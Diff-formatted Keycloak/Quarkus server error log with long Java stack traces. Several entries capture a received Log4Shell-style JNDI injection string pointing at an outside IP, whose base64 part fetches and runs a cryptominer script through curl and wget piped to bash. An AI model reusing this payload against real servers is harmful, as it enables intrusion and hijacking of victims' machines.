+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:26,373 ERROR [org.keycloak.services.error.KeycloakErrorHandler] (executor-thread-1) Uncaught server error: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.jboss.resteasy.core.registry.MatchCache$Key.<init>(MatchCache.java:30)
+        at org.jboss.resteasy.core.registry.RootNode.match(RootNode.java:62)
+        at org.jboss.resteasy.core.registry.RootClassNode.match(RootClassNode.java:42)
+        at org.jboss.resteasy.core.ResourceMethodRegistry.getResourceInvoker(ResourceMethodRegistry.java:439)
+        at org.jboss.resteasy.core.SynchronousDispatcher.getInvoker(SynchronousDispatcher.java:293)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:233)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:26,374 ERROR [io.quarkus.vertx.http.runtime.QuarkusErrorHandler] (executor-thread-1) HTTP Request to /$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-l%7D$%7B::-d%7D$%7B::-a%7D$%7B::-p%7D://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D failed, error id: 4e2a995e-7c00-4107-b725-273f385b1612-3: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.keycloak.utils.MediaTypeMatcher.isHtmlRequest(MediaTypeMatcher.java:8)
+        at org.keycloak.services.error.KeycloakErrorHandler.getResponse(KeycloakErrorHandler.java:68)
+        at org.keycloak.services.error.KeycloakErrorHandler.toResponse(KeycloakErrorHandler.java:51)
+        at org.jboss.resteasy.core.ExceptionHandler.executeExceptionMapper(ExceptionHandler.java:139)
+        at org.jboss.resteasy.core.ExceptionHandler.handleException(ExceptionHandler.java:346)
+        at org.jboss.resteasy.core.SynchronousDispatcher.writeException(SynchronousDispatcher.java:205)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:236)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:26,414 ERROR [org.keycloak.services.error.KeycloakErrorHandler] (executor-thread-1) Uncaught server error: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.jboss.resteasy.core.registry.MatchCache$Key.<init>(MatchCache.java:30)
+        at org.jboss.resteasy.core.registry.RootNode.match(RootNode.java:62)
+        at org.jboss.resteasy.core.registry.RootClassNode.match(RootClassNode.java:42)
+        at org.jboss.resteasy.core.ResourceMethodRegistry.getResourceInvoker(ResourceMethodRegistry.java:439)
+        at org.jboss.resteasy.core.SynchronousDispatcher.getInvoker(SynchronousDispatcher.java:293)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:233)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:26,417 ERROR [io.quarkus.vertx.http.runtime.QuarkusErrorHandler] (executor-thread-1) HTTP Request to /$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-l%7D$%7B::-d%7D$%7B::-a%7D$%7B::-p%7D://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw== failed, error id: 4e2a995e-7c00-4107-b725-273f385b1612-4: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.keycloak.utils.MediaTypeMatcher.isHtmlRequest(MediaTypeMatcher.java:8)
+        at org.keycloak.services.error.KeycloakErrorHandler.getResponse(KeycloakErrorHandler.java:68)
+        at org.keycloak.services.error.KeycloakErrorHandler.toResponse(KeycloakErrorHandler.java:51)
+        at org.jboss.resteasy.core.ExceptionHandler.executeExceptionMapper(ExceptionHandler.java:139)
+        at org.jboss.resteasy.core.ExceptionHandler.handleException(ExceptionHandler.java:346)
+        at org.jboss.resteasy.core.SynchronousDispatcher.writeException(SynchronousDispatcher.java:205)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:236)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-05 05:25:21,635 ERROR [io.vertx.ext.web.RoutingContext] (vert.x-eventloop-thread-2) Unhandled exception in router
+2025-09-05 05:26:12,075 ERROR [io.vertx.ext.web.RoutingContext] (vert.x-eventloop-thread-0) Unhandled exception in router
+2025-09-05 09:17:26,800 ERROR [io.vertx.ext.web.RoutingContext] (vert.x-eventloop-thread-1) Unhandled exception in router
+2025-09-05 12:48:27,297 ERROR [io.vertx.ext.web.RoutingContext] (vert.x-eventloop-thread-2) Unhandled exception in router
